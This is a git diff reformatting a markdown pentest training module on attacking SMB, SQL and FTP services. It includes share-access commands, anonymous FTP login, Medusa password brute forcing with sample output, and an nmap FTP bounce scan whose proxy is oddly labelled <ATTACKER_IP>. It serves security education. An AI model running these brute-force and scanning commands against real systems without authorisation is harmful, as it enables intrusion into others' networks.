@@ -1,7 +1,8 @@
-# 🛠️ Attacking Common Services  
-*In the vast networked domains, familiar services stand as both guardians and unwitting gateways to the abyss. This module guides the adept through the ritual of enumerating and probing these common sentinels, unveiling hidden weaknesses and ancient vulnerabilities ripe for exploitation.*
+# 🛠️ Attacking Common Services
 
-> *“Every open port is a whisper in the dark, waiting to be answered.”*
+_In the vast networked domains, familiar services stand as both guardians and unwitting gateways to the abyss. This module guides the adept through the ritual of enumerating and probing these common sentinels, unveiling hidden weaknesses and ancient vulnerabilities ripe for exploitation._
+
+> _“Every open port is a whisper in the dark, waiting to be answered.”_
 
 ---
 
@@ -31,9 +32,10 @@ This section will focus primarily on **internal file-sharing services**, althoug
 **SMB** is a network file-sharing protocol most commonly used in **Windows environments**. It enables users and applications to read, write, and manage files on remote servers as if they were local. In a Windows network, it is common to find **shared folders** accessible over SMB, often used for collaboration or centralized file storage.
 
 We can interact with SMB shares through:
-* **Graphical User Interface (GUI)** – e.g., Windows File Explorer.
-* **Command-Line Interface (CLI)** – e.g., `net use`, `dir`, or PowerShell commands in Windows; `smbclient` in Linux.
-* **Specialized tools** – e.g., Impacket scripts, CrackMapExec, enum4linux.
+
+- **Graphical User Interface (GUI)** – e.g., Windows File Explorer.
+- **Command-Line Interface (CLI)** – e.g., `net use`, `dir`, or PowerShell commands in Windows; `smbclient` in Linux.
+- **Specialized tools** – e.g., Impacket scripts, CrackMapExec, enum4linux.
 
 The following sections will outline common methods for accessing and interacting with SMB from both Windows and Linux systems.
 
@@ -51,9 +53,16 @@ Press `WINKEY` + `R` on your keyboard.
 
 In the Run dialog box, type the file share location in the following format:
 
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
 ```cmd
 \\<IP>\<SHARE_NAME>
 ```
+
+</td></tr>
+</table>
 
 **Step 3: Authenticate if required**
 
@@ -72,10 +81,20 @@ The command dir displays a list of a directory's files and subdirectories.
 
 **Run the `dir` command on the share**
 
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
 ```cmd
 dir  \\<IP>\<SHARE_NAME>
 ```
-```cmd
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
 C:\tom> dir \\192.168.220.129\Finance\
 
 Volume in drive \\192.168.220.129\Finance has no label.
@@ -88,31 +107,54 @@ Directory of \\192.168.220.129\Finance
                1 Dir(s)  15,207,469,056 bytes free
 ```
 
+</td></tr>
+</table>
+
 </details>
 
 <details>
 <summary><h4>Windows CMD - Net Use</h4></summary>
 
-
 **OPTION 1 > Step 1: Use `net use` to connect to the share**
+
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
 
 ```cmd
 net use n: \\<IP>\<SHARE_NAME>
 ```
 
+</td></tr>
+</table>
+
 **OPTION 2 > Step 1: Use `net use` and provide a username and password to authenticate to the share**
+
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
 
 ```cmd
 net use n: \\<IP>\<SHARE_NAME> /user:<USER> <PASSWORD>
 ```
 
+</td></tr>
+</table>
+
 With the shared folder mapped as the `n` drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
 
 **Step 2: Find how many files the shared folder and its subdirectories contain.**
 
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
 ```cmd
 dir n: /a-d /s /b | find /c ":\"
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -121,18 +163,29 @@ dir n: /a-d /s /b | find /c ":\"
 
 **Run the `Get-ChildItem` command on the share**
 
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
+<tr><td width="20%">**`PS C:\>`**</td><td>
+
 ```powershell
 Get-ChildItem \\<IP>\<SHARE_NAME>
 ```
-```powershell
-# PS C:\tom> Get-ChildItem \\192.168.220.129\Finance\
 
-#     Directory: \\192.168.220.129\Finance
+</td></tr>
+<tr><td colspan="2">
 
-# Mode                 LastWriteTime         Length Name
-# ----                 -------------         ------ ----
-# d-----         2/23/2022   3:27 PM                Contracts
+---
+
 ```
+    Directory: \\192.168.220.129\Finance
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         2/23/2022   3:27 PM                Contracts
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -141,11 +194,22 @@ Get-ChildItem \\<IP>\<SHARE_NAME>
 
 **OPTION 1 > Step 1: Map the shared folder to a drive letter using `New-PSDrive`**
 
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
+<tr><td width="20%">**`PS C:\>`**</td><td>
+
 ```powershell
 New-PSDrive -Name "N" -Root "\\<IP>\<SHARE_NAME>" -PSProvider "FileSystem"
 ```
 
+</td></tr>
+</table>
+
 **OPTION 2 > Step 1: Provide a username and password with Powershell to map the shared folder to a drive letter using `New-PSDrive`**
+
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
+<tr><td width="20%">**`PS C:\>`**</td><td>
 
 ```powershell
 $username = '<USER>'
@@ -154,18 +218,34 @@ $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
 New-PSDrive -Name "N" -Root "\\<IP>\<SHARE_NAME>" -PSProvider "FileSystem" -Credential $cred
 ```
-```powershell
-# Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
-# ----           ---------     --------- --------      ----                                               ---------------
-# N                                      FileSystem    \\192.168.220.129\Finance
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
+```
+Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
+----           ---------     --------- --------      ----                                               ---------------
+N                                      FileSystem    \\192.168.220.129\Finance
 ```
 
+</td></tr>
+</table>
+
 **Step 2: Find how many files the shared folder and its subdirectories contain.**
+
+<table width="100%">
+<tr><td colspan="2"> ⚡ <b>PowerShell</b> </td></tr>
+<tr><td width="20%">**`PS C:\>`**</td><td>
 
 ```powershell
 N:
 (Get-ChildItem -File -Recurse | Measure-Object).Count
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -183,25 +263,46 @@ Linux (UNIX) machines can also browse and mount SMB shares. This works whether t
 
 **OPTION 1 > Step 1: Mount an SMB share to interact with its directories and files locally**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo mkdir /mnt/<SHARE_NAME>
 sudo mount -t cifs -o username=<USER>,password=<PASWORD>,domain=. \\<IP>\<SHARE_NAME>
 ```
 
+</td></tr>
+</table>
+
 **OPTION 1 > Step 2: Use a credential file to mount an SMB share to interact with its directories and files locally**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sudo mkdir /mnt/<SHARE_NAME>
 sudo mount -t cifs \\<IP>\<SHARE_NAME> /mnt/<SHARE_NAME> -o credentials=./credential_file.txt
 ```
 
+</td></tr>
+</table>
+
 The file `credential_file.txt` has to be structured like this:
 
-```txt
+<table width="100%">
+<tr><td colspan="2"> 📄 <b>credential_file.txt</b> </td></tr>
+<tr><td colspan="2">
+
+```
 username=plaintext
 password=Password123
 domain=.
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -217,23 +318,37 @@ domain=.
 
 The `sqlcmd` utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:
 
-* At the command prompt.
-* In Query Editor in SQLCMD mode.
-* In a Windows script file.
-* In an operating system (Cmd.exe) job step of a SQL Server Agent job.
+- At the command prompt.
+- In Query Editor in SQLCMD mode.
+- In a Windows script file.
+- In an operating system (Cmd.exe) job step of a SQL Server Agent job.
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 sqsh -S <IP> -U <USER> -P <PASSWORD>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
 <details>
 <summary><h4>Linux - SQLCMD</h4></summary>
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sqlcmd -S <IP> -U <USER> -P <PASSWORD>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -242,9 +357,16 @@ sqlcmd -S <IP> -U <USER> -P <PASSWORD>
 
 **Start an interactive SQL Session using Linux**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 mysql -u <USER> -p<PASSWORD> -h <IP>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -253,9 +375,16 @@ mysql -u <USER> -p<PASSWORD> -h <IP>
 
 **Start an interactive SQL Session using Windows**
 
-```bash
+<table width="100%">
+<tr><td colspan="2"> 📟 <b>CMD</b> </td></tr>
+<tr><td width="20%">**`C:\>`**</td><td>
+
+```cmd
 mysql.exe -u <USER> -p<PASSWORD> -h <IP>
 ```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -264,17 +393,17 @@ mysql.exe -u <USER> -p<PASSWORD> -h <IP>
 <details>
 <summary><h3>Tools to Interact with Common Services</h3></summary>
 
-| **SMB**        | **FTP**      | **Email**                       | **Databases**                               |
-|----------------|-------------|----------------------------------|---------------------------------------------|
-| smbclient      | ftp         | Thunderbird                     | mssql-cli                                   |
-| CrackMapExec   | lftp        | Claws                           | mycli                                       |
-| SMBMap         | ncftp       | Geary                           | mssqlclient.py                              |
-| Impacket       | filezilla   | MailSpring                      | dbeaver                                     |
-| psexec.py      | crossftp    | mutt                            | MySQL Workbench                             |
-| smbexec.py     |             | mailutils                       | SQL Server Management Studio (SSMS)        |
-|                |             | sendEmail                       |                                             |
-|                |             | swaks                           |                                             |
-|                |             | sendmail                        |                                             |
+| **SMB**      | **FTP**   | **Email**   | **Databases**                       |
+| ------------ | --------- | ----------- | ----------------------------------- |
+| smbclient    | ftp       | Thunderbird | mssql-cli                           |
+| CrackMapExec | lftp      | Claws       | mycli                               |
+| SMBMap       | ncftp     | Geary       | mssqlclient.py                      |
+| Impacket     | filezilla | MailSpring  | dbeaver                             |
+| psexec.py    | crossftp  | mutt        | MySQL Workbench                     |
+| smbexec.py   |           | mailutils   | SQL Server Management Studio (SSMS) |
+|              |           | sendEmail   |                                     |
+|              |           | swaks       |                                     |
+|              |           | sendmail    |                                     |
 
 </details>
 
@@ -285,11 +414,11 @@ Depending on the **Windows** or **Linux** version we are working with or targeti
 
 Common reasons for **lack of access** to a resource include:
 
-* Authentication issues
-* Insufficient privileges
-* Network connectivity problems
-* Firewall restrictions
-* Unsupported protocols
+- Authentication issues
+- Insufficient privileges
+- Network connectivity problems
+- Firewall restrictions
+- Unsupported protocols
 
 Errors may vary depending on the specific service targeted. It’s important to leverage these **error codes** by consulting official documentation or community forums, where solutions to similar problems can often be found.
 
@@ -322,13 +451,13 @@ The concept is structured around four categories that appear in every vulnerabil
 
 We can generalize **Source** as the origin of information used by a process to perform a specific task. Information can be passed to a process in many different ways.
 
-| Information Source | Description                                                                                                           |
-|--------------------|-----------------------------------------------------------------------------------------------------------------------|
-| Code               | The results of already executed program code used as a source of information. These can come from different functions of a program. |
+| Information Source | Description                                                                                                                                                                           |
+| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Code               | The results of already executed program code used as a source of information. These can come from different functions of a program.                                                   |
 | Libraries          | A collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications. |
-| Config             | Usually static or prescribed values that determine how the process handles information.                              |
-| APIs               | Application Programming Interfaces used as program interfaces for retrieving or providing information.               |
-| User Input         | Manual entry of information by a person, when a program allows user input to process data accordingly.               |
+| Config             | Usually static or prescribed values that determine how the process handles information.                                                                                               |
+| APIs               | Application Programming Interfaces used as program interfaces for retrieving or providing information.                                                                                |
+| User Input         | Manual entry of information by a person, when a program allows user input to process data accordingly.                                                                                |
 
 The Source is the origin exploited to trigger vulnerabilities. The specific protocol used is irrelevant—for example, HTTP header injections can be manipulated manually, just like buffer overflows.
 
@@ -339,13 +468,13 @@ The Source is the origin exploited to trigger vulnerabilities. The specific prot
 
 The **Process** refers to how information received from the Source is handled. This processing is carried out according to the task defined by the program code. For each task, developers specify how information should be processed—using classes, functions, calculations, loops, and more. Since development approaches vary widely, the possibilities are nearly endless. Consequently, most vulnerabilities stem from flaws in the program code executed during this process.
 
-| Process Components | Description                                                                                                          |
-|--------------------|----------------------------------------------------------------------------------------------------------------------|
+| Process Components | Description                                                                                                                                                     |
+| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | PID                | The Process ID (PID) identifies the process being started or already running. Running processes have assigned privileges, and new ones are started accordingly. |
-| Input              | Refers to information input assigned either by a user or resulting from a programmed function.                       |
-| Data processing    | The hard-coded functions of a program that dictate how the received information is processed.                         |
-| Variables          | Placeholders for information that different functions can further process during the task.                           |
-| Logging            | The documentation of certain events, often stored in a register or file, meaning some information remains in the system. |
+| Input              | Refers to information input assigned either by a user or resulting from a programmed function.                                                                  |
+| Data processing    | The hard-coded functions of a program that dictate how the received information is processed.                                                                   |
+| Variables          | Placeholders for information that different functions can further process during the task.                                                                      |
+| Logging            | The documentation of certain events, often stored in a register or file, meaning some information remains in the system.                                        |
 
 </details>
 
@@ -358,13 +487,13 @@ Similarly, privileges (or “tickets”) can apply to various modes of transport
 
 When a process attempts to perform a task, the system checks if it has the necessary privileges. If the required permissions and conditions are met, the system approves the requested action.
 
-| Privileges | Description                                                                                                          |
-|------------|----------------------------------------------------------------------------------------------------------------------|
+| Privileges | Description                                                                                                           |
+| ---------- | --------------------------------------------------------------------------------------------------------------------- |
 | System     | These are the highest privileges allowing any system modification. In Windows, this is called SYSTEM; in Linux, root. |
-| User       | Permissions assigned to a specific user. For security, Linux often creates separate users for specific services.     |
+| User       | Permissions assigned to a specific user. For security, Linux often creates separate users for specific services.      |
 | Groups     | Categorization of users who share certain permissions to perform specific actions.                                    |
 | Policies   | Determine execution of application-specific commands, applying to individual or grouped users and their actions.      |
-| Rules      | Permissions to perform actions managed within the applications themselves.                                           |
+| Rules      | Permissions to perform actions managed within the applications themselves.                                            |
 
 </details>
 
@@ -377,9 +506,9 @@ This endpoint is called the **Destination**, where the data changes occur. Desti
 
 Once the data is stored or forwarded, the cycle of the task is complete.
 
-| Destination | Description                                                                                                               |
-|-------------|---------------------------------------------------------------------------------------------------------------------------|
-| Local       | The local area refers to the system environment where the process occurred. Results are either further processed or stored locally. |
+| Destination | Description                                                                                                                                                                                              |
+| ----------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Local       | The local area refers to the system environment where the process occurred. Results are either further processed or stored locally.                                                                      |
 | Network     | The network area involves forwarding process results to a remote interface, such as an IP address, its services, or entire networks. Under some circumstances, these results can also influence routing. |
 
 </details>
@@ -430,10 +559,11 @@ The initial configuration of devices and software often includes default setting
 Accepting default settings during setup can expose sensitive company information. Attackers may exploit default credentials or weak settings with minimal effort, sometimes just by a quick internet search.
 
 **[Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)** is listed in the **[OWASP Top 10](https://owasp.org/Top10/)**. Common issues related to default values include:
-* Unnecessary features enabled or installed (e.g., open ports, unused services, default pages, accounts, or privileges).
-* Default accounts and passwords remain enabled and unchanged.
-* Error handling exposes stack traces or overly detailed error messages to users.
-* On upgraded systems, new security features are disabled or improperly configured.
+
+- Unnecessary features enabled or installed (e.g., open ports, unused services, default pages, accounts, or privileges).
+- Default accounts and passwords remain enabled and unchanged.
+- Error handling exposes stack traces or overly detailed error messages to users.
+- On upgraded systems, new security features are disabled or improperly configured.
 
 </details>
 
@@ -442,25 +572,25 @@ Accepting default settings during setup can expose sensitive company information
 
 Once we understand our environment, the most effective way to control risk is to lock down critical infrastructure and allow only necessary behaviors. Any communication or service not required by the application should be disabled. Examples include:
 
-* Disabling admin interfaces when not in use.
-* Turning off debugging features.
-* Disabling default usernames and passwords.
-* Configuring servers to prevent unauthorized access, directory listing, and related issues.
-* Running regular scans and audits to detect misconfigurations or missing patches.
+- Disabling admin interfaces when not in use.
+- Turning off debugging features.
+- Disabling default usernames and passwords.
+- Configuring servers to prevent unauthorized access, directory listing, and related issues.
+- Running regular scans and audits to detect misconfigurations or missing patches.
 
 The **OWASP Top 10** includes guidance on securing installation processes, emphasizing the importance of a repeatable hardening process:
 
-* Use a consistent hardening procedure to quickly and easily deploy secure environments.
-* Configure development, QA, and production environments identically but with different credentials per environment.
-* Automate this process to minimize setup effort and errors.
+- Use a consistent hardening procedure to quickly and easily deploy secure environments.
+- Configure development, QA, and production environments identically but with different credentials per environment.
+- Automate this process to minimize setup effort and errors.
 
 Other best practices include:
 
-* Maintain a minimal platform by removing or not installing unnecessary features, components, documentation, and sample code.
-* Regularly review and update configurations to apply security notes, updates, and patches (see A06:2021 - Vulnerable and Outdated Components). Also, review cloud storage permissions, such as S3 bucket policies.
-* Implement a segmented application architecture to enforce secure separation between components or tenants via segmentation, containerization, or cloud security groups (ACLs).
-* Send security directives to clients, such as appropriate security headers.
-* Automate verification processes to ensure configuration effectiveness across all environments.
+- Maintain a minimal platform by removing or not installing unnecessary features, components, documentation, and sample code.
+- Regularly review and update configurations to apply security notes, updates, and patches (see A06:2021 - Vulnerable and Outdated Components). Also, review cloud storage permissions, such as S3 bucket policies.
+- Implement a segmented application architecture to enforce secure separation between components or tenants via segmentation, containerization, or cloud security groups (ACLs).
+- Send security directives to clients, such as appropriate security headers.
+- Automate verification processes to ensure configuration effectiveness across all environments.
 
 </details>
 
@@ -473,43 +603,44 @@ When attacking a service, we act like detectives — gathering as much informati
 
 **Example Scenario**
 
-* Target services: Email, FTP, Databases, Storage
-* Goal: Achieve Remote Code Execution (RCE) on any service
-* Initial enumeration: Tried anonymous access on all services
-* Outcome: Only FTP allowed anonymous access
-* Found an empty file named `johnsmith` in FTP
-* Tried using "johnsmith" as FTP username and password — unsuccessful
-* Tried same credentials on Email service — successful login
-* Searched emails for "password" and found John’s MSSQL credentials
-* Accessed the MSSQL database and used built-in functions to execute commands
-* Successfully gained RCE on the database server
+- Target services: Email, FTP, Databases, Storage
+- Goal: Achieve Remote Code Execution (RCE) on any service
+- Initial enumeration: Tried anonymous access on all services
+- Outcome: Only FTP allowed anonymous access
+- Found an empty file named `johnsmith` in FTP
+- Tried using "johnsmith" as FTP username and password — unsuccessful
+- Tried same credentials on Email service — successful login
+- Searched emails for "password" and found John’s MSSQL credentials
+- Accessed the MSSQL database and used built-in functions to execute commands
+- Successfully gained RCE on the database server
 
 This shows how a seemingly insignificant piece of data (the empty file `johnsmith`) can lead to discovering valuable information and achieving the ultimate goal.
 
 **Types of Sensitive Information to Look For**
 
 Usernames
-* Email Addresses
-* Passwords
-* DNS Records
-* IP Addresses
-* Source Code
-* Configuration Files
-* Personally Identifiable Information (PII)
+
+- Email Addresses
+- Passwords
+- DNS Records
+- IP Addresses
+- Source Code
+- Configuration Files
+- Personally Identifiable Information (PII)
 
 **Covered Services for Information Discovery**
 
-* File Shares
-* Email
-* Databases
+- File Shares
+- Email
+- Databases
 
 **Understanding What to Look For**
 
 Every target is unique, so it’s important to:
 
-* Understand the target’s business model, purpose, and processes
-* Determine what information is valuable to the target
-* Know what type of information is useful for your attack
+- Understand the target’s business model, purpose, and processes
+- Determine what information is valuable to the target
+- Know what type of information is useful for your attack
 
 Two key elements for finding sensitive information:
 
@@ -528,18 +659,20 @@ Two key elements for finding sensitive information:
 The **File Transfer Protocol (FTP)** is a standard network protocol used to transfer files between computers.
 It also supports file system operations such as:
 
-* Changing the working directory
-* Listing files
-* Renaming files or directories
-* Deleting files or directories
+- Changing the working directory
+- Listing files
+- Renaming files or directories
+- Deleting files or directories
 
 **Default Port:**
-* TCP/21
+
+- TCP/21
 
 **Common Uses**
-* Moving files between systems in software development environments
-* Updating or deploying website content
-* Sharing large datasets within an organization
+
+- Moving files between systems in software development environments
+- Updating or deploying website content
+- Sharing large datasets within an organization
 
 <details>
 <summary><h2>Attack Vectors</h2></summary>
@@ -547,17 +680,17 @@ It also supports file system operations such as:
 When targeting an FTP server, there are several possible approaches:
 
 1. **Misconfiguration or Excessive Privileges**
-    * Anonymous access enabled
-    * Improper file/directory permissions
-    * Sensitive files stored in publicly accessible directories
+   - Anonymous access enabled
+   - Improper file/directory permissions
+   - Sensitive files stored in publicly accessible directories
 
 2. **Exploiting Known Vulnerabilities**
-    * Outdated FTP server software
-    * Weak authentication mechanisms
+   - Outdated FTP server software
+   - Weak authentication mechanisms
 
 3. **Discovering New Vulnerabilities**
-    * Protocol-specific flaws
-    * Vendor-specific bugs
+   - Protocol-specific flaws
+   - Vendor-specific bugs
 
 </details>
 
@@ -566,15 +699,15 @@ When targeting an FTP server, there are several possible approaches:
 
 Once access is gained, you should:
 
-* **Enumerate the directory contents** to identify sensitive or critical files
+- **Enumerate the directory contents** to identify sensitive or critical files
 
-* **Check folder structure** — FTP typically uses a hierarchical directory structure:
+- **Check folder structure** — FTP typically uses a hierarchical directory structure:
 
-* **Search for sensitive files**, such as:
-    * Configuration files (`config.php`, `.env`)
-    * Database dumps (`backup.sql`)
-    * Source code files
-    * Credentials
+- **Search for sensitive files**, such as:
+  - Configuration files (`config.php`, `.env`)
+  - Database dumps (`backup.sql`)
+  - Source code files
+  - Credentials
 
 </details>
 
@@ -583,22 +716,30 @@ Once access is gained, you should:
 
 **Example Command**
 
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
+
 ```bash
 sudo nmap -sC -sV -p 21 <TARGET_IP>
 ```
 
-| Flag            | Purpose                                         |
-|-----------------|-------------------------------------------------|
-| `-sC`           | Run default NSE scripts (includes `ftp-anon`)   |
-| `-sV`           | Detect service version and banner               |
-| `-p 21`         | Scan only TCP port 21                           |
-| `<TARGET_IP>` | Target IP address                               |
+</td></tr>
+</table>
+
+| Flag          | Purpose                                       |
+| ------------- | --------------------------------------------- |
+| `-sC`         | Run default NSE scripts (includes `ftp-anon`) |
+| `-sV`         | Detect service version and banner             |
+| `-p 21`       | Scan only TCP port 21                         |
+| `<TARGET_IP>` | Target IP address                             |
 
 **Why This Matters**
-* **Anonymous access** may expose files without authentication.
-* **Version information** helps identify:
-    * Known vulnerabilities
-    * Possible exploits for the specific FTP server software
+
+- **Anonymous access** may expose files without authentication.
+- **Version information** helps identify:
+  - Known vulnerabilities
+  - Possible exploits for the specific FTP server software
 
 </details>
 
@@ -609,55 +750,83 @@ As discussed earlier, **anonymous authentication** can be enabled for services s
 This can create serious security risks if not configured properly.
 
 How Anonymous FTP Login Works
-* **Username:** `anonymous`
-* **Password:** *(empty)*
+
+- **Username:** `anonymous`
+- **Password:** _(empty)_
 
 **Potential Risks**
 If read/write permissions are **not** configured correctly:
-* Sensitive files might be stored in folders accessible to anonymous users.
-* Anyone could **download confidential data** without authentication.
-* Attackers could **upload malicious scripts** to the server.
+
+- Sensitive files might be stored in folders accessible to anonymous users.
+- Anyone could **download confidential data** without authentication.
+- Attackers could **upload malicious scripts** to the server.
 
 **Example Command**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 ftp <TARGET_IP> <PORT>
 ```
-```bash
-# Connected to <TARGET_IP>.
-# 220 (vsFTPd 2.3.4)
-# Name (<TARGET_IP>:kali): anonymous
-# 331 Please specify the password.
-# Password:
-# 230 Login successful.
-# Remote system type is UNIX.
-# Using binary mode to transfer files.
 
-# ftp> ls
+</td></tr>
+<tr><td colspan="2">
 
-# 200 PORT command successful. Consider using PASV.
-# 150 Here comes the directory listing.
-# -rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
-# 226 Directory send OK.
+---
+
 ```
+Connected to <TARGET_IP>.
+220 (vsFTPd 2.3.4)
+Name (<TARGET_IP>:kali): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0               9 Aug 12 16:51 test.txt
+226 Directory send OK.
+```
+
+</td></tr>
+</table>
 
 </details>
 
 <details>
 <summary><h2>Brute Forcing with Medusa</h2></summary>
 
-**Example Command: **
+**Example Command:**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 medusa -u <USER_LIST> -P <PASSWORD_LIST> -h <TARGET_IP> -M ftp -n <PORT>
 ```
-```bash
-# Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>                                                      
-# ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
-# ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
-# ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
-# ACCOUNT FOUND: [ftp] Host: <TARGET_IP> User: <USER> Password: <PASSWORD> [SUCCESS]
+
+</td></tr>
+<tr><td colspan="2">
+
+---
+
 ```
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456 (1 of 14344392 complete)
+ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 12345 (2 of 14344392 complete)
+ACCOUNT CHECK: [ftp] Host: <TARGET_IP> (1 of 1, 0 complete) User: <USER> (1 of 1, 0 complete) Password: 123456789 (3 of 14344392 complete)
+ACCOUNT FOUND: [ftp] Host: <TARGET_IP> User: <USER> Password: <PASSWORD> [SUCCESS]
+```
+
+</td></tr>
+</table>
 
 </details>
 
@@ -673,38 +842,51 @@ This is achieved by manipulating the `PORT` command to make the FTP server conne
 2. They use the `PORT` command to instruct the FTP server to interact with another host on the same internal network (e.g., `Internal_DMZ`).
 3. The FTP server unknowingly **proxies requests** to the internal host.
 4. This allows the attacker to:
-   * Scan internal hosts
-   * Identify open ports
-   * Gather information for further exploitation
+   - Scan internal hosts
+   - Identify open ports
+   - Gather information for further exploitation
 
 **Example Command**
+
+<table width="100%">
+<tr><td colspan="2"> ⚔️ <b>AttackHost</b> </td></tr>
+<tr><td width="20%">**`kali@kali:~$`**</td><td>
 
 ```bash
 nmap -Pn -v -n -p80 -b <USER>:<PASSWORD>@<ATTACKER_IP> <TARGET_IP>
 ```
-```bash
-# Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
-# Resolved FTP bounce attack proxy to <ATTACKER_IP> (<ATTACKER_IP>).
-# Attempting connection to ftp://anonymous:password@<ATTACKER_IP>:21
-# Connected: 220 (vsFTPd 3.0.3)
-# Login credentials accepted by FTP server!
-# Initiating Bounce Scan at 04:55
-# FTP command misalignment detected ... correcting.
-# Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
 
-# Nmap scan report for <TARGET_IP>
-# Host is up.
+</td></tr>
+<tr><td colspan="2">
 
-# PORT   STATE  SERVICE
-# 80/tcp open  http
+---
+
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-27 04:55 EDT
+Resolved FTP bounce attack proxy to <ATTACKER_IP> (<ATTACKER_IP>).
+Attempting connection to ftp://anonymous:password@<ATTACKER_IP>:21
+Connected: 220 (vsFTPd 3.0.3)
+Login credentials accepted by FTP server!
+Initiating Bounce Scan at 04:55
+FTP command misalignment detected ... correcting.
+Completed Bounce Scan at 04:55, 0.54s elapsed (1 total ports)
+
+Nmap scan report for <TARGET_IP>
+Host is up.
+
+PORT   STATE  SERVICE
+80/tcp open  http
 ```
 
-| **Flag** | **Purpose** |
-|----------|-------------|
-| `-Pn`    | Skip host discovery, treat all hosts as online. |
-| `-v`     | Verbose output. |
-| `-n`     | Disable DNS resolution. |
-| `-p80`   | Scan only TCP port 80. |
+</td></tr>
+</table>
+
+| **Flag** | **Purpose**                                                 |
+| -------- | ----------------------------------------------------------- |
+| `-Pn`    | Skip host discovery, treat all hosts as online.             |
+| `-v`     | Verbose output.                                             |
+| `-n`     | Disable DNS resolution.                                     |
+| `-p80`   | Scan only TCP port 80.                                      |
 | `-b`     | Perform FTP bounce scan (`user:pass@ftp_server target_ip`). |
 
 > **NOTE:** FTP bounce attacks are deprecated in many modern FTP servers, but vulnerable implementations still exist in outdated or misconfigured environments.
@@ -732,10 +914,10 @@ When scanning, SMB on **port 445** indicates direct TCP usage, while **port 139*
 
 **Attacking SMB** involves identifying its version, OS, and configuration. Potential vectors include:
 
-* **Misconfigurations/excessive privileges**
-* **Known or new vulnerabilities**
-* **Sensitive shared files**
